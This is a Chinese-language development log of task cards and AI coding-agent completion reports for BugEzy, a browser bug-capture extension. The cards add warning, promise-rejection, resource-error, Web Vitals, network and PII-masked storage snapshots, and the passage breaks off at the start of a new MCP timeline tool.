# job-0705.md — BugEzy Day 20

> 接續 job-0704.md（PM-136~152）

---

### 🟡 PM-153：Bug 捕捉升級 — console.warn 完整捕捉（CORS #5 + Mixed Content #7）

**問題**：inject.ts 的 console 攔截可能只抓 error 層級，遺漏 warn。CORS 錯誤和 Mixed Content 警告大部分出在 `console.warn`，小白工程師最困惑的兩類問題就這樣漏掉了。

**目標**：確保 inject.ts 攔截 console.warn，且上傳報告 / 即時監控都包含 warn 層級。

---

#### §1 檢查 inject.ts console 攔截

搜尋 inject.ts 中 console 攔截的程式碼，確認是否已攔截 `console.warn`：

```ts
// 應該攔截的層級
const levels = ['error', 'warn'];

levels.forEach(level => {
  const original = console[level];
  console[level] = function(...args: any[]) {
    // 記錄到 BugEzy 收集器
    collectConsoleLog({ level, message: args.map(String).join(' '), timestamp: Date.now() });
    // 呼叫原始方法
    original.apply(console, args);
  };
});
```

如果現在只攔截 `error`，加上 `warn`。

---

#### §2 即時監控也要捕捉 warn

即時監控的 error 偵測邏輯（inject.ts 的 `updateMonitorBadge`），如果只計算 error 不計 warn，改為兩者都計。

但 UI 要區分：
- error → ❌ 紅色
- warn → ⚠️ 橘色

error panel 顯示時用不同顏色區分。

---

#### §3 報告上傳確認

createReport payload 的 `consoleLogs` 確認包含 warn 層級的記錄，不只 error。

---

#### §4 MCP get_console_logs 確認

MCP tool 回傳的 console logs 確認包含 warn（應該本來就包含，只要 inject.ts 有收集就行）。

---

#### §5 不改的東西

- server / MCP tool 邏輯：不動（只要 inject 有收集，其他層自動帶到）
- popup / annotate：不動
- network error 捕捉：不動

#### Build

```
cd extension && npm run build
```

#### 驗收

1. 開測試頁 → 觸發 `console.warn('test warn')` → BugEzy 有捕捉到
2. 即時監控 → 觸發 warn → 狀態條顯示「⚠️ 發現 1 個錯誤」
3. 錄製 → 觸發 warn → 報告有 warn 記錄
4. MCP get_console_logs → 回傳含 warn 層級

---

### ✅ DONE-153 — Claude Code 回報（2026-07-05）

**結論：四項需求「早已全部實作」**（PM-04 加了 warn+error 攔截、PM-52/139 做了監控面板 + 顏色）。逐項稽核 + build 確認，**無程式碼變更**（`npm run build` 產物與需求一致）。

**逐項核對（附 file:line 佐證）**：
1. **§1 console.warn 攔截**：`inject.ts:640` `console.warn = (...) => { level:'warn' ... bgConsoleLogs.push + (recording ? consoleLogs.push + flush) }`；`inject.ts:650` 同款 `console.error`。註解 `inject.ts:638` 明寫「只抓 warn + error」。✅ 已含 warn。
2. **§2 即時監控計 warn**：`updateMonitorBadge`（`inject.ts:173`）算 `bgConsoleLogs.length + bgNetworkErrors.length`——`bgConsoleLogs` 同時含 warn+error（無過濾），觸發 warn 即 +1。**error panel 顏色區分**（`inject.ts:262-263`）：error → ❌ `#ef4444`（紅）、warn → ⚠ `#f59e0b`（橘）。✅
3. **§3 報告含 warn**：錄製時 warn 進 `consoleLogs`（recording buffer）→ `createReport` server 端 `console_logs: payload.consoleLogs`（原封存，`index.ts:2588`）。✅
4. **§4 MCP 含 warn**：`get_console_logs`（`server index.ts:3702`）`select('console_logs')` 原封回傳，無 level 過濾。全 pipeline 唯一 `level === 'error'` 是 §2 的顏色判斷（不丟 warn）。✅

**建置**：`npm run build` ✅；tsc 通過；`dist/inject.js` 確認含 `"warn"` level + `f59e0b` 橘色 + 19 處 `console.warn`。

**⚠ 重要澄清（給 FOX，關於 CORS / Mixed Content 的真實限制）**：
- 本卡攔截的是**頁面 JS 呼叫的** `console.warn()`/`console.error()`——若頁面程式自己 `catch(e => console.error(e))` 記 CORS 失敗，會被抓到。
- 但**瀏覽器引擎「自己印」的 CORS 封鎖 / Mixed Content 警告**（DevTools console 那些紅字）**不經過 JS console API**，是瀏覽器內部直接輸出 → **monkey-patch console 抓不到**，content script 也無權存取（需 `chrome.debugger`/DevTools Protocol，MV3 content script 做不到）。
- 真正能補捉 CORS 的管道是**網路攔截**：CORS 被擋的 `fetch()` 會 reject（TypeError，非 4xx/5xx 回應）。目前 fetch 攔截主要收 4xx/5xx，**被 reject 的 CORS 失敗未必收到**。若要強化 CORS 捕捉，應在網路攔截層加「catch rejected fetch → 記為 network error」——但本卡 §5 明列「network error 捕捉：不動」，故未動；建議另開卡處理（P2）。

**DONE-153**

---

### 🟡 PM-154：Bug 捕捉升級 — unhandledrejection + window.onerror（Promise 靜默 #8 + 框架錯誤 #6）

**問題**：
- **#8 Promise 靜默失敗**：小白最常犯 `async/await` 忘了 `catch`，錯誤完全消失，console 什麼都沒有
- **#6 框架錯誤**：React Error Boundary / Vue errorHandler 吞掉的錯誤不進 console

**修法**：inject.ts 加兩個全域事件監聽，兜住所有漏網之魚。

---

#### §1 inject.ts：加 unhandledrejection 監聽

```ts
window.addEventListener('unhandledrejection', (event) => {
  const reason = event.reason;
  const message = reason instanceof Error
    ? `Unhandled Promise Rejection: ${reason.message}\n${reason.stack || ''}`
    : `Unhandled Promise Rejection: ${String(reason)}`;
  
  collectConsoleLog({
    level: 'error',
    message: message,
    timestamp: Date.now(),
    source: 'unhandledrejection',
  });
  
  // 即時監控也要更新
  updateMonitorCount();
});
```

---

#### §2 inject.ts：加 window.onerror 監聽

```ts
window.addEventListener('error', (event) => {
  // 區分 JS 執行錯誤 vs 資源載入錯誤
  // event.target 是 HTMLElement（img/script/link）→ 資源載入失敗（PM-155 處理）
  // event.target 是 window → JS 執行錯誤
  if (event.target === window || event.target === document) {
    const message = `${event.message || 'Script Error'} at ${event.filename || 'unknown'}:${event.lineno || 0}:${event.colno || 0}`;
    collectConsoleLog({
      level: 'error',
      message: message,
      timestamp: Date.now(),
      source: 'window.onerror',
    });
    updateMonitorCount();
  }
  // 資源載入錯誤在 PM-155 用 capture:true 處理
}, false);  // bubbling phase（JS 錯誤）
```

---

#### §3 避免重複計算

console.error 攔截 + window.onerror + unhandledrejection 可能對同一個錯誤重複記錄。加去重邏輯：

```ts
const recentErrors = new Set<string>();

function dedupeCollect(log: ConsoleLog) {
  const key = `${log.level}:${log.message.slice(0, 100)}`;
  if (recentErrors.has(key)) return; // 已記錄過，跳過
  recentErrors.add(key);
  // 5 秒後清除（允許相同錯誤再次記錄）
  setTimeout(() => recentErrors.delete(key), 5000);
  collectConsoleLog(log);
}
```

所有收集點（console 攔截 / onerror / unhandledrejection）都改呼叫 `dedupeCollect`。

---

#### §4 不改的東西

- server / MCP：不動
- popup / annotate：不動
- console.error / console.warn 攔截（PM-153）：不動，只是多了兩個額外來源

#### Build

```
cd extension && npm run build
```

#### 驗收

1. 測試頁加一個 `Promise.reject('test')` 不 catch → BugEzy 捕捉到「Unhandled Promise Rejection: test」
2. 測試頁加一個 `undefinedFunction()` → window.onerror 捕捉到
3. 同一個錯誤不重複記錄（去重生效）
4. 即時監控數字正確

---

### ✅ DONE-154 — Claude Code 回報（2026-07-05）

**完成內容**（只改 `extension/src/inject.ts` + `types.ts`；server/MCP/popup/annotate/network 攔截不動，符合 §4）：

1. **§3 統一收集 + 去重**：把 console.warn/error 的重複邏輯抽成 `collectConsoleLog(entry)`，內含去重——`key = level + 訊息前 100 字`，5 秒內只記一次（`recentErrors` Set + `setTimeout` 清除）。console.warn/error + 兩個新監聽**全部**走這條，避免同一錯誤（onerror + 頁面 catch 又 console.error）重複塞報告。
2. **§1 unhandledrejection**（#8 Promise 靜默失敗）：`window.addEventListener('unhandledrejection', ...)` → `reason instanceof Error` 帶 message + stack、否則 `stringifyArgs`；`level:'error'`、`source:'unhandledrejection'`。
3. **§2 window error**（#6 框架吞掉的錯誤）：`window.addEventListener('error', ..., false)`（bubbling）→ 只抓 `target === window/document`（JS 執行錯誤），組 `message at file:line:col`、`source:'window.onerror'`。**資源載入失敗（img/script/link，capture phase 不冒泡）明確留給 PM-155**。
4. **types.ts**：`ConsoleLog` 加 `source?: string`（選填，向後相容；console 省略、兩來源標記）。

**設計要點**：
- 兩監聽走同一 `collectConsoleLog` → 自動享 recording buffer flush + 背景 buffer + `updateMonitorBadge`（即時監控數字含這兩類）+ 去重。
- unhandled/onerror 皆 `level:'error'` → error panel 顯 ❌ 紅（PM-153 顏色機制沿用）。
- listener 在 inject 初始化區註冊一次（與 console 攔截同層，共享 recording/bgConsoleLogs 閉包）。

**驗收（build 產物）**：tsc `--noEmit` 通過；`npm run build` ✅；`dist/inject.js` 確認含 `unhandledrejection`(2)、`Unhandled Promise Rejection`(1)、`window.onerror`(1)、`recentErrors`/`collectConsoleLog`(9)、`addEventListener("error")`(1)。實機驗收（Promise.reject/undefinedFunction/去重/監控數字）需瀏覽器。

**建置**：`npm run build` ✅（未 deploy，依指示——純 extension）。

**備註**：驗收①②③需在測試頁觸發——`/test` 頁在 server（本卡不動、未 deploy），可在任意頁 DevTools console 手動 `Promise.reject('test')` / 呼叫未定義函式驗證；資源載入錯誤（404 img 等）目前不抓，PM-155 處理。

**DONE-154**

---

### 🟡 PM-155：Bug 捕捉升級 — Resource 載入失敗 + Web Vitals 效能（#9 #10）

**問題**：
- **#9 資源載入失敗**：圖片/CSS/JS/字型 404 或 CORS 被擋 → 頁面破版，但 console 沒有明顯 error，小白不知道壞在哪
- **#10 頁面太慢**：LCP/CLS/FID 數據沒捕捉，使用者只知道慢，AI 無法診斷

---

#### §1 inject.ts：Resource 載入失敗捕捉

用 `window.addEventListener('error', ..., true)` 的 **capture phase** 抓資源載入錯誤（img/script/link/video 的 404 等）：

```ts
window.addEventListener('error', (event) => {
  const target = event.target as HTMLElement;
  
  // 只處理資源載入錯誤（非 JS 執行錯誤，JS 在 PM-154 的 bubbling phase 處理）
  if (target === window || target === document) return;
  
  // 取得資源 URL
  const src = (target as HTMLImageElement).src
    || (target as HTMLScriptElement).src
    || (target as HTMLLinkElement).href
    || '';
  
  if (!src) return;
  
  const tagName = target.tagName?.toLowerCase() || 'unknown';
  const message = `Resource load failed: <${tagName}> ${src}`;
  
  dedupeCollect({
    level: 'warn',
    message: message,
    timestamp: Date.now(),
    source: 'resource-error',
  });
  
  updateMonitorCount();
}, true);  // capture phase（資源錯誤不冒泡，必須 capture）
```

---

#### §2 inject.ts：Web Vitals 效能捕捉

用 `PerformanceObserver` 捕捉核心 Web Vitals：

```ts
function collectWebVitals() {
  try {
    // LCP (Largest Contentful Paint) — 最大內容繪製時間
    new PerformanceObserver((list) => {
      const entries = list.getEntries();
      const last = entries[entries.length - 1] as any;
      if (last) {
        collectPerformanceMetric('LCP', Math.round(last.startTime), 'ms');
      }
    }).observe({ type: 'largest-contentful-paint', buffered: true });

    // CLS (Cumulative Layout Shift) — 累計版面位移
    let clsValue = 0;
    new PerformanceObserver((list) => {
      for (const entry of list.getEntries() as any[]) {
        if (!entry.hadRecentInput) clsValue += entry.value;
      }
      collectPerformanceMetric('CLS', Math.round(clsValue * 1000) / 1000, '');
    }).observe({ type: 'layout-shift', buffered: true });

    // FID (First Input Delay) — 首次輸入延遲
    new PerformanceObserver((list) => {
      const entry = list.getEntries()[0] as any;
      if (entry) {
        collectPerformanceMetric('FID', Math.round(entry.processingStart - entry.startTime), 'ms');
      }
    }).observe({ type: 'first-input', buffered: true });
  } catch (e) {
    // 部分瀏覽器不支援某些 observer，靜默失敗
  }
}

function collectPerformanceMetric(name: string, value: number, unit: string) {
  // 判斷是否超標
  const thresholds: Record<string, [number, string]> = {
    'LCP': [2500, '慢（超過 2.5 秒）'],
    'CLS': [0.1, '版面位移過大'],
    'FID': [100, '互動延遲過高'],
  };
  const [threshold, desc] = thresholds[name] || [Infinity, ''];
  const status = value > threshold ? '⚠️ ' + desc : '✅ 良好';

  dedupeCollect({
    level: value > threshold ? 'warn' : 'info',
    message: `Web Vital ${name}: ${value}${unit} ${status}`,
    timestamp: Date.now(),
    source: 'web-vitals',
  });
}

// 頁面載入後執行
collectWebVitals();
```

---

#### §3 效能資料存到報告

Web Vitals 收集後跟 console logs 一起存入報告 payload。MCP `get_console_logs` 自動就能讀到（因為存在同一個 consoleLogs 陣列）。

---

#### §4 即時監控 error panel 顯示

resource error 用 🖼️ 圖示、web vitals 用 ⚡ 圖示，在 error panel 區分顯示。

---

#### §5 不改的東西

- server / MCP：不動（console logs 陣列本來就全吃）
- popup / annotate：不動
- PM-153 的 warn 捕捉 / PM-154 的 rejection + onerror：不動

#### Build

```
cd extension && npm run build
```

#### 驗收

1. 測試頁加一個 `<img src="https://fake.url/404.png">` → 捕捉到「Resource load failed: <img> ...」
2. 測試頁加一個 `<script src="https://fake.url/404.js"></script>` → 捕捉到
3. 頁面載入後 → Web Vitals LCP/CLS/FID 有記錄
4. LCP > 2.5s 的頁面 → warn「慢（超過 2.5 秒）」
5. 即時監控 error panel 有 resource error + web vitals

---

### ✅ DONE-155 — Claude Code 回報（2026-07-05）

**完成內容**（只改 `extension/src/inject.ts` + `types.ts`；server/MCP/popup/annotate 不動，符合 §5）：

1. **§1 資源載入失敗**（#9）：`window.addEventListener('error', ..., true)` **capture phase**（資源錯誤不冒泡）→ `target instanceof HTMLElement`（排除 window/document 的 JS 錯誤，那些 PM-154 bubbling 已收）→ 取 `src||href`→ `Resource load failed: <tag> url`，`level:'warn'`、`source:'resource-error'`。
2. **§2 Web Vitals**（#10）：`collectWebVitals()` 用 `PerformanceObserver` 觀測 **LCP**（取最後一筆）/ **CLS**（累加，排除 hadRecentInput）/ **FID**（首次輸入）。LCP/CLS 值會變 → 頁面**隱藏或載入 5 秒**「定案」回報一次（`finalized` 旗標防重複，避免每次 observer 觸發都塞列）；FID 首次輸入即報。不支援的 entry type 靜默略過。
3. **§重點③ 超標 warn / 良好 info**：閾值 LCP 2500ms / CLS 0.1 / FID 100ms；超標 `level:'warn'` + `⚠️ 描述`、良好 `level:'info'` + `✅ 良好`。訊息 `Web Vital LCP: 1234ms ✅ 良好`。
4. **§重點④ 皆走 collectConsoleLog**（PM-154 的去重入口）→ 自動享錄製/背景 buffer + flush + 監控更新 + 去重。
5. **§4 error panel 圖示區分**：`resource-error → 🖼️`、`web-vitals → ⚡`（info 綠 `#3fb950` / warn 橘）、error ❌ 紅、warn ⚠ 橘。
6. **監控計數修正**：`updateMonitorBadge` 排除 `level==='info'`（良好 Web Vitals 不算「錯誤」，不灌爆「發現 N 個錯誤」）；warn 級（超標 vital / 資源失敗）仍計入。
7. **types.ts**：`ConsoleLog.level` 加 `'info'`。

**設計取捨**：
- LCP/CLS「定案回報一次」而非每次 observer 觸發都記——避免 CLS 每次位移都塞一列（去重也擋不住值一直變的訊息）。代價：若錄製在 5 秒內結束且頁面未隱藏，該次錄製可能缺 LCP/CLS（背景 buffer 仍會在 5 秒後補上，供監控/回溯）。
- 資源錯誤用 `instanceof HTMLElement` 精準分流（capture listener 也會收到 window 的 JS 錯誤，明確排除）。

**驗收（build 產物）**：tsc `--noEmit` 通過；`npm run build` ✅；`dist/inject.js` 確認含 `Resource load failed`、`PerformanceObserver`(2)、`Web Vital`、`largest-contentful-paint`/`layout-shift`/`first-input`、`resource-error`/`web-vitals`、`3fb950`（info 綠）、`info` 排除邏輯。實機驗收（404 img/script、Web Vitals 記錄、超標 warn、panel 圖示）需瀏覽器。

**建置**：`npm run build` ✅（未 deploy，依指示——純 extension）。

**里程碑**：Bug 捕捉升級三卡（PM-153 warn / PM-154 rejection+onerror / PM-155 resource+web-vitals）完成——console/JS/Promise/資源/效能五類漏網之魚全兜住，皆經去重入口 + 即時監控 + 報告 + MCP。

**DONE-155**

---

### 🟡 PM-156：Bug 捕捉升級 — 網路環境快照

**背景**：小白常遇到「我的電腦上好的，客戶那邊就壞」。原因通常是網路環境不同——3G vs WiFi、高延遲、離線等。AI 看不到網路狀態就無法診斷。

**目標**：在錄製/截圖/即時監控上傳報告時，自動附帶網路環境快照。

---

#### §1 inject.ts：收集網路環境

```ts
function getNetworkSnapshot(): Record<string, unknown> {
  const conn = (navigator as any).connection;
  return {
    online: navigator.onLine,
    effectiveType: conn?.effectiveType || 'unknown',  // '4g', '3g', '2g', 'slow-2g'
    rtt: conn?.rtt ?? null,                            // 延遲 ms
    downlink: conn?.downlink ?? null,                  // 頻寬 Mbps
    saveData: conn?.saveData ?? false,                 // 省流量模式
    type: conn?.type || 'unknown',                     // 'wifi', 'cellular', 'ethernet'
  };
}
```

`navigator.connection` 是 Chrome 61+ 支援的 Network Information API，BugEzy 的目標瀏覽器完全沒問題。

---

#### §2 錄製時捕捉

在錄製開始時（startRecording）和結束時（stopRecording）各抓一次網路快照，存入報告 payload：

```ts
const reportPayload = {
  // ...現有欄位
  networkSnapshot: {
    atStart: getNetworkSnapshot(),
    atEnd: getNetworkSnapshot(),
  },
};
```

這樣 AI 能看到「錄製開始時 4G、結束時離線」→ 診斷 API 失敗原因。

---

#### §3 即時監控上傳也帶

PM-124 的「📤 上傳報告讓 AI 分析」也附帶網路快照。透過 postMessage 傳給 content → background：

```ts
window.postMessage({
  type: 'BUGEZY_UPLOAD_MONITOR_REPORT',
  errors: collectedErrors,
  networkSnapshot: getNetworkSnapshot(),
}, '*');
```

---

#### §4 截圖標注也帶

annotate.ts 上傳報告時也附帶 `getNetworkSnapshot()`。annotate 頁面可以直接用 navigator API（不是 MAIN world 限制的 inject.ts）。

---

#### §5 Server：createReport 接收 networkSnapshot

server 的 createReport 把 networkSnapshot 存進 Supabase reports 表。如果 reports 表沒有 networkSnapshot 欄位，加一個 JSONB 欄位：

```sql
ALTER TABLE reports ADD COLUMN IF NOT EXISTS network_snapshot JSONB DEFAULT NULL;
```

**⚠️ FOX 要手動跑這個 SQL。**

---

#### §6 MCP：報告摘要包含網路狀態

現有的 `get_report_overview` 或 `getDetails` 回傳資料加上 networkSnapshot 欄位。MCP tool 不用改，因為 `select('*')` 自動包含新欄位。

---

#### §7 報告頁顯示

報告頁（`/report/:id`）加一個「📡 網路環境」區塊：

```html
📡 網路環境
┌────────────────────┐
│ 狀態：🟢 在線       │
│ 類型：WiFi / 4G     │
│ 延遲：45ms          │
│ 頻寬：10.5 Mbps     │
└────────────────────┘
```

---

#### §8 不改的東西

- console / network / DOM 捕捉：不動
- 認證 / ECPay：不動
- popup 設定：不動

#### 前置：FOX 跑 SQL（§5）

```sql
ALTER TABLE reports ADD COLUMN IF NOT EXISTS network_snapshot JSONB DEFAULT NULL;
```

#### Build + Deploy

```
cd server && npx wrangler deploy
cd extension && npm run build
```

#### 驗收

1. 錄製 → 報告有 networkSnapshot（atStart + atEnd）
2. 即時監控上傳 → 報告有 networkSnapshot
3. 截圖 → 報告有 networkSnapshot
4. 報告頁顯示「📡 網路環境」區塊
5. MCP 讀報告能看到 networkSnapshot
6. 離線時錄製 → networkSnapshot.online = false

---

### ✅ DONE-156 — Claude Code 回報（2026-07-05）

**完成內容**（extension + server 全鏈打通）：

1. **§1 getNetworkSnapshot()**：抽到共用檔 `extension/src/net.ts`（inject MAIN world + annotate 擴充頁共用，避免重複）。回傳 `{ online, effectiveType, rtt, downlink, saveData, type }`——`navigator.onLine` + `navigator.connection`（Chrome 61+ Network Information API），不支援時 effectiveType/type 回 `'unknown'`、rtt/downlink 回 `null`。新增 `NetworkSnapshot` / `NetworkSnapshotBundle`（`{ atStart, atEnd? }`）型別於 `types.ts`，`RecordingPayload.networkSnapshot?` 掛上。
2. **§2 錄製 atStart + atEnd**：`inject.ts` 模組變數 `networkAtStart`，`startRecording` 開錄即抓；`stopRecording` 的 RESULT payload 帶 `{ atStart: networkAtStart ?? getNetworkSnapshot(), atEnd: getNetworkSnapshot() }`——一頭一尾，離線/降速等錄製中的變化都留痕。
3. **§3 即時監控 + 截圖標注**：REWIND、UPLOAD_MONITOR（即時監控上傳）payload 各帶 `{ atStart: getNetworkSnapshot() }`（單次即可，非長錄製）；`annotate.ts`（截圖標注上傳）payload 同帶 `{ atStart: getNetworkSnapshot() }`。
4. **§4 server 存 JSONB**：`createReport` insert 帶 `network_snapshot`；沿用 PM-82 的 graceful fallback——若欄位不存在（`/allow_screenshot_images|network_snapshot/` 比對 error）自動退回 baseRow 重試，**FOX 未跑 ALTER 也不會 500**。`getReport` 回 `networkSnapshot: data.network_snapshot ?? null`。
5. **§5 報告頁「📡 網路環境」區塊**：REPORT_PAGE_HTML 於「📊 摘要」前插入，`fmtNet(x)` 顯示 狀態（🟢 在線 / 🔴 離線）/ 類型（wifi/4g…）/ 延遲（rtt ms）/ 頻寬（downlink Mbps）/ 資料節省，`atEnd` 與 `atStart` 不同時另列「結束時：」。無 networkSnapshot 的舊報告不顯示該區塊。
6. **schema.sql**：加 `ALTER TABLE reports ADD COLUMN IF NOT EXISTS network_snapshot JSONB DEFAULT NULL;`（PM-156 註記）。

**驗收（線上實測）**：
- server `npx wrangler deploy` ✅（Version `13aea42e`）；extension tsc + `npm run build` ✅。
- POST `/api/reports` 帶 networkSnapshot → **200**（含 atStart 4g/rtt50/wifi/online + atEnd offline/unknown）。
- GET `/api/reports/:id` → **完整 round-trip**：`networkSnapshot.atStart` = `{online:true, effectiveType:'4g', rtt:50, downlink:10.5, type:'wifi'}`、`atEnd` = `{online:false, effectiveType:'unknown', rtt:null, ...}`。→ **network_snapshot 欄位已存在、資料正確寫入並取回**。
- 報告頁 HTML 確認含 `📡 網路環境` + `fmtNet`。
- MCP `get_report_overview` / `get_page_info` 走同 getReport → 自動帶 networkSnapshot（§驗收 5）。

**FOX 待辦**：本次線上實測 network_snapshot 欄位**已存在**（round-trip 成功），若為新環境請跑 §5 SQL。graceful fallback 已確保未跑也不掛。

**里程碑**：Bug 捕捉升級四卡（PM-153~156）完成——console/JS/Promise/資源/效能**五類漏網錯誤** + **網路環境快照**，AI 診斷「我這好好的、客戶那壞」多一維上下文。

**DONE-156**

---

### 🟡 PM-157：Bug 捕捉升級 — 儲存空間快照 + PII 遮罩（#9.3→9.5）

**背景**：小白常遇到「登入狀態突然消失」「資料怎麼不見了」。原因通常是 localStorage/sessionStorage/cookie 的使用問題。AI 看不到儲存狀態就無法診斷。

**敏感資料處理**：儲存空間可能含密碼、token、信用卡號。必須在**使用者端（extension）就自動遮罩**，server 永遠不碰敏感原值。

---

#### §1 inject.ts：收集儲存空間快照

```ts
function getStorageSnapshot(): Record<string, unknown> {
  return {
    localStorage: snapshotStorage(window.localStorage),
    sessionStorage: snapshotStorage(window.sessionStorage),
    cookieCount: document.cookie ? document.cookie.split(';').length : 0,
    cookieNames: document.cookie
      ? document.cookie.split(';').map(c => c.trim().split('=')[0])
      : [],
  };
}

function snapshotStorage(storage: Storage): Array<{ key: string; size: number; value: string }> {
  const items: Array<{ key: string; size: number; value: string }> = [];
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    if (!key) continue;
    const rawValue = storage.getItem(key) || '';
    items.push({
      key: key,
      size: rawValue.length,
      value: maskPII(key, rawValue),  // 遮罩敏感值
    });
  }
  return items;
}
```

---

#### §2 PII 遮罩（核心安全機制）

```ts
// 敏感 key 名稱模式
const SENSITIVE_KEYS = /password|passwd|pwd|token|secret|key|api.?key|auth|credential|credit.?card|card.?num|cvv|ssn|session/i;

// 敏感值模式（email、信用卡號、JWT）
const SENSITIVE_VALUES = [
  /\b[\w.-]+@[\w.-]+\.\w{2,}\b/g,                    // email
  /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g,    // 信用卡號
  /eyJ[\w-]+\.eyJ[\w-]+\.[\w-]+/g,                     // JWT token
];

function maskPII(key: string, value: string): string {
  // 1. key 名稱敏感 → 整個值遮罩
  if (SENSITIVE_KEYS.test(key)) {
    return '***MASKED***';
  }
  
  // 2. 值太長（>500 字元）→ 截斷 + 標示大小
  if (value.length > 500) {
    return value.slice(0, 100) + `... (${value.length} chars, truncated)`;
  }
  
  // 3. 值裡含敏感模式 → 局部遮罩
  let masked = value;
  SENSITIVE_VALUES.forEach(pattern => {
    masked = masked.replace(pattern, '***');
  });
  
  return masked;
}
```

**遮罩在 inject.ts（使用者本機）執行，server 只收到遮罩後的結果。**

---

#### §3 報告 payload 加入儲存快照

錄製/截圖/即時監控上傳時附帶：

```ts
const reportPayload = {
  // ...現有欄位
  storageSnapshot: getStorageSnapshot(),
};
```

---

#### §4 Server：createReport 接收 storageSnapshot

```sql
ALTER TABLE reports ADD COLUMN IF NOT EXISTS storage_snapshot JSONB DEFAULT NULL;
```

**⚠️ FOX 要手動跑這個 SQL。**

---

#### §5 報告頁顯示

報告頁加「💾 儲存狀態」區塊：

```html
💾 儲存狀態
┌───────────────────────────────────────┐
│ localStorage (5 items)                │
│  • user_token: ***MASKED***           │
│  • theme: "dark" (4 chars)            │
│  • lang: "zh" (2 chars)              │
│  • cart: "[{\"id\":1}]" (12 chars)   │
│  • lastLogin: "2026-07-05" (10 chars)│
│                                       │
│ sessionStorage (1 item)               │
│  • tempData: "hello" (5 chars)       │
│                                       │
│ Cookies: 3 (auth, _ga, theme)        │
└───────────────────────────────────────┘
```

---

#### §6 MCP 自動包含

`get_report_overview` / `getDetails` 的 `select('*')` 自動包含 storage_snapshot，不用改 MCP tool。

---

#### §7 不改的東西

- console / network / DOM / 網路環境捕捉：不動
- 認證 / ECPay：不動
- popup 設定：不動

#### 前置：FOX 跑 SQL（§4）

```sql
ALTER TABLE reports ADD COLUMN IF NOT EXISTS storage_snapshot JSONB DEFAULT NULL;
```

#### Build + Deploy

```
cd server && npx wrangler deploy
cd extension && npm run build
```

#### 驗收

1. 錄製 → 報告有 storageSnapshot（localStorage + sessionStorage + cookies）
2. localStorage 有 `token` key → 值顯示 `***MASKED***`
3. localStorage 有 email 值 → 局部遮罩 `***`
4. 值 > 500 字元 → 截斷
5. 報告頁顯示「💾 儲存狀態」區塊
6. MCP 讀報告能看到 storageSnapshot（遮罩後）

---

### ✅ DONE-157 — Claude Code 回報（2026-07-05）

**完成內容**（extension + server 全鏈打通；PII 遮罩全在使用者本機執行）：

1. **§1+§2 getStorageSnapshot() + maskPII()**：抽共用檔 `extension/src/storage.ts`（inject MAIN world + 未來擴充頁共用）。
   - `getStorageSnapshot()` → `{ localStorage, sessionStorage, cookieCount, cookieNames }`；`localStorage`/`sessionStorage` 為 `{key,size,value}[]`（`size`=遮罩前原字元數），cookie **只留名稱不留值**（值常含 session token，且 httpOnly 本就讀不到）。storage 存取用 try/catch 兜住跨源/隱私模式 `SecurityError`。
   - `maskPII(key,value)` 三層：①**敏感 key**（`password|token|secret|key|auth|credential|credit.?card|cvv|ssn|session…`）→ 整值 `***MASKED***`；②**>500 字元** → `前100字 + (N chars, truncated)`；③**值含敏感模式** → 局部 `***`（email / 信用卡號 4-4-4-4 / JWT `eyJ….eyJ….sig`）。
2. **§3 遮罩在本機、payload 帶 storageSnapshot**：`inject.ts` 三處上傳點各帶 `storageSnapshot: getStorageSnapshot()`——錄製 stop（RESULT）、回溯（REWIND）、即時監控（UPLOAD_MONITOR）。**server 只收到遮罩後結果**，原始敏感值永不離開使用者機器。`types.ts` 新增 `StorageItem`/`StorageSnapshot` + `RecordingPayload.storageSnapshot?`。
3. **§4 server 存 JSONB**：`createReport` insert 帶 `storage_snapshot`（延用 PM-82/156 graceful fallback——欄位不存在時 regex 比對 error 自動退回 baseRow 重試，**FOX 未跑 ALTER 也不會 500**）；`getReport` 回 `storageSnapshot: data.storage_snapshot ?? null`。`schema.sql` 加 `ALTER … storage_snapshot JSONB`。
4. **§5 報告頁「💾 儲存狀態」區塊**：於「📡 網路環境」後、「📊 摘要」前插入。`fmtItems(label,items)` 列 localStorage/sessionStorage 各項 `key: 遮罩後值 (N chars)`，Cookies 顯示數量 + 名稱列表，底部標「🔒 敏感值已於使用者端自動遮罩」。無 storageSnapshot 的舊報告不顯示。
5. **§6 MCP 自動含**：`get_report_overview` 等走同 getReport → 自動帶遮罩後 storageSnapshot，無需改 MCP tool。

**設計判斷（範圍內修正）**：
- **截圖標注（annotate.ts）未帶 storageSnapshot**：annotate 是 `chrome-extension://` 擴充頁，其 `localStorage` 是**擴充自身**的儲存，**讀不到被測網站的 storage**。若硬帶會上傳誤導性的擴充內部資料，故略過（網路快照無此問題，網路是機器層級，PM-156 保留）。此為忠實工程判斷，特此標明。
- cookie 一律只上傳名稱（`cookieNames`），不上傳值——即使非敏感 key 也不冒險。

**驗收（線上實測）**：
- server `npx wrangler deploy` ✅（Version `cb910db5`）；extension tsc + `npm run build` ✅（`dist/inject.js` 確認含 `getStorageSnapshot`/`MASKED`/`sessionStorage`/`truncated`）。
- POST `/api/reports` 帶 storageSnapshot → **200**；GET `/api/reports/:id` → **完整 round-trip**（localStorage 3 項含 `user_token:***MASKED***`、`profile:contact ***`、sessionStorage、`cookieNames:[auth,_ga,theme]`）→ **storage_snapshot 欄位已存在、遮罩後資料正確寫入取回**。
- 報告頁模板確認含 `r.storageSnapshot` / `fmtItems` / `cookieNames` / 遮罩提示 + `💾 儲存狀態`（報告頁為 client 端渲染，資料由 getReport 餵入）。

**FOX 待辦**：線上實測 `storage_snapshot` 欄位**已存在**（round-trip 成功）；新環境才需跑 §4 SQL。graceful fallback 已保未跑也不掛。實機驗收（真實網站 token key→`***MASKED***`、email 值局部遮罩、>500 字元截斷）需瀏覽器載入擴充。

**里程碑**：Bug 捕捉升級五卡（PM-153~157）完成——console/JS/Promise/資源/效能五類漏網錯誤 + 網路環境 + **儲存狀態（含本機 PII 遮罩）**，AI 診斷「登入狀態突然消失」多一維上下文，且敏感資料零外洩。

**DONE-157**

---

### 🟡 PM-158：MCP 新增 `get_timeline` — 時序麵包屑（所有資料合成一條故事線）

**背景**：目前 AI 要讀一份報告需要呼叫 5+ 個 MCP tool（console logs、network errors、voice transcript、rrweb summary、report overview）。每次呼叫都花 token，而且 AI 要自己對照時間軸拼湊因果。

**目標**：新增一個 `get_timeline` MCP tool，把一份報告的所有資料按時間排序，合成一條人類可讀的時間軸。AI 只要呼叫一次就能看到完整故事。

---

#### §1 Server：新增 MCP tool `get_timeline`

```ts
server.tool(
